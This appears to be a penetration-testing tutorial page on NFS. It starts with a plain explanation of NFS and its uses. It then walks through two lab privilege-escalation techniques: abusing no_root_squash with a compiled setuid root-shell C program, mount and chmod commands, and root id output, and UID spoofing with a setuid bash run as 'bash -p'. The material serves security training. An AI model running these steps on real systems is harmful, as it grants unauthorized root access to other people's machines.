---
icon: copy
---

# Network File System (NFS)

## INTRO

Network file sharing (NFS) is a protocol used for sharing files and directories between computers on a network. NFS is useful when there is a need to quickly share a large number of files across many devices. Once set up on a file server, any computer on the network that the client services are installed on can connect to the NFS server and access all files and directories. On a client computer, an NFS drive is mounted much like a local drive, making it easy for users to navigate.

However, users access the same files stored on the NFS drive and not copies, which means changes made to a file on an NFS drive will also change the original on the NFS server.

### When is NFS needed?

NFS is typically used for sharing big files or a large volume of files across multiple computers within a network.

For example, large video files are shared between editors at a production house. A single file could be in the hundreds of gigabytes, with multiple collaborators working on it. Not only is sharing such large files with each editor challenging, but also storing them locally on each computer can result in extremely high storage costs. Having a central storage space, however, can significantly lower expenses.

Per-computer licensing fees for professional applications can also increase costs. Installing these applications on an NFS server allows multiple users to access the application remotely with the same license, thereby reducing costs.

Another common example involves shared study materials and resources in a classroom or a lab. Using NFS, the school can upload resources to one central location. This makes it easy for students and faculty to access them through their personal computers as if the resources were present locally.

Because NFS works with multiple technologies and environments, it doesn't matter what environment the client is running as long as they can access the NFS server. This makes it easy to configure workflows in a heterogeneous fashion&#x20;

## Weak NFS Privileges

When an NFS volume is created, various options can be set:

**Option**

**Description**

`root_squash`

If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.

`no_root_squash`

Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.

```
ExtremeUday2@htb[/htb]$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,**no_root_squas**h)
/tmp *(rw,no_root_squash)
```

First, create a simple setuid binary, mount the directory locally as root user, copy it, and set the necessary permissions as root user.

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```
#Create our exploit
ExtremeUday2@htb[/htb]$ gcc shell.c -o shell -static

#as root in your attack machine execute the next commands
root@htb[/htb]$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@htb[/htb]$ cp shell /mnt
root@htb[/htb]$ chmod u+s /mnt/shell
```

Go back the target machine and just execute it.

```
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp$ id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

### Privilege Escalation via UID Spoofing and NFS Misconfiguration (with `bash -p`) <a href="#privilege-escalation-via-uid-spoofing-and-nfs-misconfiguration-with-bash-p" id="privilege-escalation-via-uid-spoofing-and-nfs-misconfiguration-with-bash-p"></a>

In insecure NFS environments, privilege escalation can be achieved by spoofing a UID and abusing file operations through shared directories. A common technique involves using `bash -p`, which preserves the effective UID when the binary has the setuid bit.

**🔧 Steps to Exploit:**

1. **Identify a Target UID:** Find the UID of a privileged user (e.g., through `/etc/passwd` or file ownership within the NFS share).
2. **Create a Local User with Matching UID (on Attacker's Machine):**

* ```
  sudo useradd -u <target-UID> <username> --badname -p '<password>'
  ```
* **Upload Bash Binary to NFS (from Compromised Account):** Use an account (e.g., `www-data`) with write access to place a local `bash` binary into the shared NFS directory:
* ```
  cp /bin/bash /path/to/nfs/share/bash
  ```
* **Set SetUID Bit on the Bash Binary (from Attacker’s Machine):**
* ```
  mv bash /tmp/
  chmod u+s /tmp/bash
  mv /tmp/bash /path/to/nfs/share/
  ```
* **Execute Bash with Preserved UID (on Target):** From the target system, the low-privileged user can run:

```
./bash -p
```

This launches a shell with the effective privileges of the spoofed UID (typically a higher-privileged user).
